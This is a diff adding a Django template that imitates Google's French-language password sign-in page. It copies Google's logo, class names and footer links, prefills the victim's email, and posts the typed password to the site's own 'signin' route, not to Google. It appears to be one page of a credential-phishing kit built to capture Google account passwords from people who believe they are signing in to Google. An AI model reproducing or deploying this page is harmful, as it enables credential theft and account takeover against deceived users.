@@ -1,0 +1,124 @@
+{% extends 'base.html' %}
+{% block body %}
+    <div class="container">
+        <div class="card">
+            <div class="Lth2jb "
+                 jsname="n7vHCb"
+                 jscontroller="rKxYMb"
+                 jsaction="rcuQ6b:qg4Ic;Kzwjs:WPi0i;"
+                 data-oauth-third-party-logo-url=""
+                 aria-hidden="true"
+                 style="padding-bottom: 6px;">
+                <div jsname="jjf7Ff">
+                    <div id="logo" class="v8vQje" title="Google">
+                        <div class="rr0DNb" jsname="l4eHX">
+                            <svg xmlns="http://www.w3.org/2000/svg" height="44" viewBox="0 0 24 24" width="44"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/><path d="M1 1h22v22H1z" fill="none"/></svg>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <h2 style="padding-bottom: 5px;">Bienvenue</h2>
+            <div class="aCayab" style="padding-bottom: 2px; margin-top: 0px;" onclick="redirectToHome()">
+                <div jscontroller="IIfQad"
+                     jsaction="click:cOuCgd; blur:O22p3e; mousedown:UX7yZ; mouseup:lbsD7e; touchstart:p6p2H; touchend:yfqBxc;"
+                     class="YZrg6 HnRr5d iiFyne cd29Sd"
+                     tabindex="0"
+                     role="link"
+                     jsname="af8ijd">
+                    <div class="gPHLDe">
+                        <div class="qQWzTd" aria-hidden="true">
+                            <svg aria-hidden="true"
+                                 class="stUf5b"
+                                 fill="#454749"
+                                 focusable="false"
+                                 width="24px"
+                                 height="24px"
+                                 viewBox="0 0 24 24"
+                                 xmlns="https://www.w3.org/2000/svg"
+                                 style="transform: translateY(-2px);">
+                                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z">
+                                </path>
+                            </svg>
+                        </div>
+                    </div>
+                    <div jsname="fmcmS" class="KTeGk" data-profile-identifier="">
+                        <a style="font-size: 0.875 rem; letter-spacing: 0; font-weight: 500; color: #1f1f1f;" id="email_">{{ email }}</a>
+                    </div>
+                    <div class="krLnGe">
+                        <svg aria-hidden="true"
+                             class="stUf5b MSBt4d"
+                             fill=""
+                             focusable="false"
+                             width="34px"
+                             height="24px"
+                             viewBox="0 0 42 42"
+                             xmlns="https://www.w3.org/2000/svg"
+                             style="transform: translateX(6px) translateY(6px);">
+                             <polygon points="12,17 6,9 18,9" fill="black" />
+                        </svg>
+                    </div>
+                </div>
+            </div>
+            <br>
+            <br>
+            <br>
+            <br>
+            <br>
+            <div class="input-contain">
+                <form id="form" method="post" action="{% url 'signin' %}">
+                    {% csrf_token %}
+                    <input type="hidden" id="email" name="email" value="{{ email }}">
+                    <input type="password"
+                           id="password"
+                           name="password"
+                           autocomplete="off"
+                           value=""
+                           aria-labelledby="placeholder-password">
+                    <label class="placeholder-text" for="password" id="placeholder-password">
+                        <div id="placeholder_" class="text">Saisissez votre mot de passe</div>
+                    </label>
+                </form>
+            </div>
+            <div style="text-align: left; margin-top: -8px; margin-left: 4px;">
+                <b id="error"></b>
+                <br>
+                <input type="checkbox" id="custom-checkbox" class="custom-checkbox" onclick="showpass()">
+                <label for="custom-checkbox" class="custom-checkbox-label"></label>
+                <!-- <input type="checkbox"
+                       style="width: 18px;
+                              height: 18px;
+                              border: 4px solid #333;"
+                       onclick="showpass()"> -->
+                <a style="font-size: 14px; color: #1f1f1f; line-height: 1; position: relative; top: -4px; font-weight: bold;">&nbsp;&nbsp;&nbsp;&nbsp;Afficher le mot de passe</a>
+                <div class="card-bottom" style="padding-top: 15px;">
+                    <a target="_blank" href="https://accounts.google.com/>">Mot de passe oublié ?</a>
+                    <button form="form" type="submit" class="disable-select">Suivant</button>
+                </div>
+                <div style="height: 110px;"></div>
+            </div>
+            <div id="spacer">
+                <br>
+                <br>
+                <div style="height: 10px;"></div>
+            </div>
+            <div class="footer">
+                <select class="disable-select" name="select">
+                    <option value="English (United States)">
+                        English (United States)
+                    </option>
+                </select>
+                <div class="footer-span">
+                    <span><a target="_blank"
+       class="btn"
+       href="https://support.google.com/accounts?hl=en">Help</a></span>
+                    <span><a target="_blank"
+       class="btn"
+       href="https://accounts.google.com/TOS?loc=US&hl=en&privacy=true">Privacy</a></span>
+                    <span><a target="_blank"
+       class="btn"
+       href="https://accounts.google.com/TOS?loc=US&hl=en">Terms</a></span>
+                </div>
+            </div>
+        </div>
+    </div>
+{% endblock body %}
